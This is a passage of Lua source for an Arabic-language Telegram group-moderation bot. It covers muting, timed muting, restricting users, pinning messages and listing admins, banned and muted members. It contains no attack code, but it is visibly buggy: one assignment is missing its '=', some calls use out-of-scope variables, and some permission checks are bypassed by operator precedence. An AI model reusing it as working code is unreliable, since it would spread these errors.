if is_leaderid(result.sender_user_id_) == true then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙*لا تستطيع كتم المطور الاساسي ،*", 1, 'md')
return false 
end
KASPERdx1:sadd(KASPER..'bot:mutedall:', result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم كتمه في "..gps.." مجموعه𓍢\n")
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,muteall_by_reply)
end
--     By Developer KASPER     -- 
if text and text:match("^كتم عام @(.*)$") and is_sudo(msg) and KASPER11(msg) then
local KASPER_res = {string.match(text, "^(كتم عام) @(.*)$")}
local gps = KASPERdx1:scard(KASPER.."bot:groups")
function muteall_by_username(extra, result, success)
if result.id_ then
if is_leaderid(result.id_) == true then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙*لا تستطيع كتم المطور الاساسي ،*", 1, 'md')
return false 
end
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم كتمه في "..gps.." مجموعه𓍢\n")
KASPERdx1:sadd(KASPER..'bot:mutedall:', result.id_)
end end
resolve_username(KASPER_res[2],muteall_by_username)
end
--     By Developer KASPER     -- 
if text:match("^كتم عام (%d+)$") and is_sudo(msg) and KASPER11(msg) then
local res = {string.match(text, "^(كتم عام) (%d+)$")}
local gps = KASPERdx1:scard(KASPER.."bot:groups")
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. res[2])
local KASPER_res = user_info_ if user_info_ then
if is_leaderid(res[2]) == true then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙*لا تستطيع كتم المطور الاساسي ،*", 1, 'md')
return false 
end
KASPERdx1:sadd(KASPER..'bot:mutedall:', res[2])
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم كتمه في ( '..gps..' ) مجموعه*', 1, 'md')
end end
--     By Developer KASPER     -- 
if text:match("^كتم$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
function mute_by_reply(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPERdx1:get("KASPER:lock:banmu"..bot_id..msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع الكتم او التقييد \n✟︙لانه معطل من قبل المنشئ ', 1, 'md')
return "KASPER"
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*لا تستطيع كتمي*', 1, 'md')
return false 
end 
if is_momod(result.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع كتم ، '..KASPER_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
else 
KASPERdx1:sadd(KASPER..'bot:muted:'..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم  كتمه𓍢\n")
end end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
--     By Developer KASPER     -- 
if text:match('^كتم @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local KASPER_res = {string.match(text, '^(كتم) @(.*)$')}
function mute_by_username(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPERdx1:get("KASPER:lock:banmu"..bot_id..msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع الكتم او التقييد \n✟︙لانه معطل من قبل المنشئ ', 1, 'md')
return "KASPER"
end
local KASPER = 'bot:muted:'..msg.chat_id_
if result.id_ then 
if is_momod(result.id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع كتم ، '..KASPER_renk(result.id_, msg.chat_id_), 1, 'md')
else
if KASPERdx1:sismember(KASPER..KASPER, result.id_) then
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم كتمه سابقا𓍢\n")
else
KASPERdx1:sadd(KASPER..KASPER, result.id_)
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم كتمه بنجاح𓍢\n")
end end end end
resolve_username(KASPER_res[2],mute_by_username)
end
--     By Developer KASPER     -- 
if text:match("^كتم (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local res = {string.match(text, "^(كتم) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPERdx1:get("KASPER:lock:banmu"..bot_id..msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع الكتم او التقييد \n✟︙لانه معطل من قبل المنشئ ', 1, 'md')
return "KASPER"
end
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. res[2])
local KASPER_res = user_info_ if user_info_ then
if is_momod(res[2], msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع كتم ، '..KASPER_renk(res[2], msg.chat_id_), 1, 'md')
else
if KASPERdx1:sismember(KASPER..'bot:muted:'..msg.chat_id_, res[2]) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم  ( كتمه ) سابقا ،*', 1, 'md')
end
KASPERdx1:sadd(KASPER..'bot:muted:'..msg.chat_id_, res[2])
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم  ( كتمه ) ،*', 1, 'md')
end end end
--     By Developer KASPER     -- 
if text:match("^الغاء كتم$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
function unmute_by_reply(extra, result, success)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER = 'bot:muted:'..msg.chat_id_
local KASPER_res = user_info_ if user_info_ then
if not KASPERdx1:sismember(KASPER..KASPER, result.sender_user_id_) then
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙لم يتم كتمه سابقا𓍢\n")
else
KASPERdx1:srem(KASPER..KASPER, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم الغاء كتمه𓍢\n")
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
end
--     By Developer KASPER     -- 
if text:match("^الغاء كتم @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local res = {string.match(text, "^(الغاء كتم) @(.*)$")}
function unmute_by_username(extra, result, success)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.id_)
local KASPER_res = user_info_ 
if result.id_ then
if not KASPERdx1:sismember(KASPER..'bot:muted:'..msg.chat_id_, result.id_) then
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙لم يتم كتمه سابقا𓍢\n")
else
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم الغاء كتمه بنجاح𓍢\n")
KASPERdx1:srem(KASPER..'bot:muted:'..msg.chat_id_, result.id_)
end end end
resolve_username(res[2],unmute_by_username)
end
--     By Developer KASPER     -- 
if text:match("^الغاء كتم (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local res = {string.match(text, "^(الغاء كتم) (%d+)$")}
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. res[2])
local KASPER_res = user_info_ if user_info_ then
if not KASPERdx1:sismember(KASPER..'bot:muted:'..msg.chat_id_, res[2]) then
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙لم يتم كتمه سابقا𓍢\n")
else
KASPERdx1:srem(KASPER..'bot:muted:'..msg.chat_id_, res[2])
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم الغاء كتمه بنجاح𓍢\n")
end end end end
--     By Developer KASPER     -- 
if msg.reply_to_message_id_ ~= 0  then
if text:match("^رفع مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_
if user_info_ then
if is_leaderid(result.sender_user_id_) == true then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙*هوش لك متكدر ترفع المطور الاساسي والمبرمج ،*", 1, 'md')
return false 
end
local hash = 'bot:donky:'..msg.chat_id_
if KASPERdx1:sismember(KASPER..hash, result.sender_user_id_) then
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙هو مطي اصلا حبي 🤫😂\n")
else
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم رفعه مطي 🐴\n")
end
KASPERdx1:sadd(KASPER..hash, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     By Developer KASPER     -- 
if msg.reply_to_message_id_ ~= 0  then
if text:match("^تنزيل مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_
if user_info_ then
local hash = 'bot:donky:'..msg.chat_id_
if not KASPERdx1:sismember(KASPER..hash, result.sender_user_id_) then
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙لم يتم رفعه مطي\n")
else
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙يبقه مطي بس حنزله لخاطرك 🤫😂\n")
KASPERdx1:srem(KASPER..hash, result.sender_user_id_)
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then  
if text:match("^تقييد$") or text:match("^تقيد$") and KASPER11(msg) then  
function mute_by_reply(extra, result, success)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ تستطيع تقييدي ، ', 1, 'md')
return false 
end 
if is_momod(result.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع تقييد ، '..KASPER_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
else 
HTTPS.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.."")
KASPERdx1:sadd(KASPER..'tkeed:'..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم تقييده بنجاح𓍢\n")
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
--     By Developer KASPER     -- 
if msg.reply_to_message_id_ ~= 0 then  
if text:match("^الغاء تقييد$") or text:match("^الغاء تقيد$") and KASPER11(msg) then
function mute_by_reply(extra, result, success)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙هذا انا البوت ،', 1, 'md')
return false 
end 
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
KASPERdx1:srem(KASPER..'tkeed:'..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم الغاء تقييده بنجاح𓍢\n")
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end end end
--     By Developer KASPER     -- 
if text and text:match('^كتم د (%d+)$') and KASPER11(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^كتم د (%d+)$")}
local Minutes = string.gsub(mutept[1], 'm', '')
local num1 = tonumber(Minutes) * 60 
local num = tonumber(num1)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع كتمي ', 1, 'md')
return false end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع كتم ، '..KASPER_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم كتمه لمده ( '..mutept[1]..' ) دقيقه ،*', 1, 'md')
KASPERdx1:sadd(KASPER..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end
--     By Developer KASPER     -- 
if text and text:match('^كتم س (%d+)$') and KASPER11(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^كتم س (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600 
local num = tonumber(num1)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع كتمي ', 1, 'md')
return false end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع كتم ، '..KASPER_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم كتمه لمده ( '..mutept[1]..' ) ساعه ،*', 1, 'md')
KASPERdx1:sadd(KASPER..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
--     By Developer KASPER     -- 
if text and text:match('^كتم ي (%d+)$') and KASPER11(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^كتم ي (%d+)$")}
local day = string.gsub(mutept[1], 'd', '')
local num1 = tonumber(day) * 86400 
local num = tonumber(num1)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع كتمي ', 1, 'md')
return false end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع كتم ، '..KASPER_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم كتمه لمده ( '..mutept[1]..' ) يوم ،*', 1, 'md')
KASPERdx1:sadd(KASPER..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
--     By Developer KASPER     -- 
if text == 'مسح المقيدين' and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then     
local hash =  'tkeed:'..msg.chat_id_
local list = KASPERdx1:smembers(KASPER..hash)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..v.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
KASPERdx1:srem(KASPER..'tkeed:'..msg.chat_id_, v)
end
KASPERdx(msg.chat_id_, msg.id_, 1,'✟︙تم مسح المقيدين ، ', 1, 'md')
 end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^تثبيت$") and KASPER11(msg) then  
local id = msg.id_
local msgs = {[0] = id}
pin(msg.chat_id_,msg.reply_to_message_id_,1)
KASPERdx1:set(KASPER..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
KASPERdx(msg.chat_id_, msg.id_, 1,'✟︙تم تثبيت الرساله ، ', 1, 'md')
end end
--     By Developer KASPER     -- 
if text == ("المقيدين") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER.."tkeed:"..msg.chat_id_)
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد مقيدين ،", "md")
end
tkeed = "✟︙قائمه المقيدين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
tkeed = tkeed.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, tkeed, "md")
end end,nil) end end
--     By Developer KASPER     --  
if text == ("الادمنيه") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER.."bot:momod:"..msg.chat_id_)
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد ادمنيه ،", "md")
end
Admin = "✟︙قائمه الادمنيه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Admin = Admin.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, Admin, "md")
end end,nil) end end
--     By Developer KASPER     -- 
if text == ("المنشئين") and is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER.."bot:monsh2:"..msg.chat_id_)
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد منشئين ،", "md")
end
monsh = "✟︙قائمه المنشئين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
monsh = monsh.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, monsh, "md")
end end,nil) end end
--     By Developer KASPER     -- 
if text == ("الادمنيه العامين") and is_admin(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER.."bot:moall:")
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد ادمنيه عامين ،", "md")
end
moall = "✟︙قائمه الادمنيه العامين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
moall = moall.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, moall, "md")
end end,nil) end end
--     By Developer KASPER     -- 
if text == ("الاعضاء المميزين") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER.."bot:vipmem:"..msg.chat_id_)
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد اعضاء مميزين ،", "md")
end
vip = "✟︙قائمه الاعضاء المميزين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
vip = vip.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, vip, "md")
end end,nil) end end
--     By Developer KASPER     -- 
if text == ("المطايه") and KASPER11(msg) then 
local list = KASPERdx1:smembers(KASPER.."bot:donky:"..msg.chat_id_)
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد مطايه ،", "md")
end
donky = "✟︙قائمه المطايه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
donky = donky.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, donky, "md")
end end,nil) end end
--     By Developer KASPER     -- 
if text == ("المميزين عام") or text == ("الاعضاء المميزين عام") and is_admin(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER..'bot:vpall:')
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد مميزين عام ،", "md")
end
vpall = "✟︙قائمه المميزين عام ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
vpall = vpall.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, vpall, "md")
end end,nil) end end
--     By Developer KASPER     -- 
if text == ("المكتومين") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER.."bot:muted:"..msg.chat_id_)
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد مكتومين ،", "md")
end
muted = "✟︙قائمه المكتومين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
muted = muted.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, muted, "md")
end end,nil) end end
--     By Developer KASPER     -- 
if text == ("المدراء") and is_monsh2(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER.."bot:owners:"..msg.chat_id_)
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد مدراء ،", "md")
end
owners = "✟︙قائمه المدراء ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
owners = owners.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, owners, "md")
end end,nil) end end
--     By Developer KASPER     -- 
if text == ("المدراء العامين") and is_admin(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER..'bot:onall:')
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد مدراء عامين ،", "md")
end
onall = "✟︙قائمه المدراء العامين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
onall = onall.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, onall, "md")
end end,nil) end end
--     By Developer KASPER     --
if text == ("المنشئ") or text == ("المنشئين الاساسيين") or text == ("المنشئ الاساسي") and is_vpall(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER.."bot:monsh:"..msg.chat_id_)
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد منشئين اساسيين ،", "md")
end
monsh = "✟︙قائمه المنشئين الاساسيين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
monsh = monsh.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, monsh, "md")
end end,nil) end end
--     By Developer KASPER     --
if text == ("المحظورين") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER.."bot:banned:"..msg.chat_id_)
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد محظورين ،", "md")
end
ban = "✟︙قائمه المحظورين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
ban = ban.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, ban, "md")
end end,nil) end end
--     By Developer KASPER     --
if text == ("قائمه العام") and is_admin(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER..'bot:gban:')
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد محظورين عام ،", "md")
end
gban = "✟︙قائمه الحظر العام ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
gban = gban.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, gban, "md")
end end,nil) end end
--     By Developer KASPER     -- 
if text == ("المطورين") or text == ("مطورين الرتبه الثالثه") and is_admin(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
local list = KASPERdx1:smembers(KASPER..'bot:admins:')
if #list == 0 then
return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يوجد مطورين بهذا الرتبه ،", "md")
end
dev3 = "✟︙قائمه مطورين الرتبه الثالثه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
dev3 = dev3.."*"..k.."- »* { "..username.." }\n"
if #list == k then
return KASPERdx(msg.chat_id_, msg.id_, 1, dev3, "md")
end end,nil) end end
--     By Developer KASPER     -- 
if text:match("^قائمه المنع$") then
local hash = (KASPER..'bot:filters:'..msg.chat_id_)
if hash then
local names = KASPERdx1:hkeys(hash)
text = "✟︙قائمه الكلمات الممنوعه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for i=1, #names do
text = text..'» ، '..names[i]..'\n'
end
if #names == 0 then
text = "✟︙لا يوجد كلمات ممنوعه ،" 
end
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end end
--     By Developer KASPER     -- 
if text:match("^قائمه المنع العام$") then
local hash = (KASPER..'bot:freewords:')
if hash then
local names = KASPERdx1:hkeys(hash) 
text "✟︙قائمه الكلمات الممنوعه عام ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
for i=1, #names do
text = text..' » ، '..names[i]..'\n'
end
if #names == 0 then
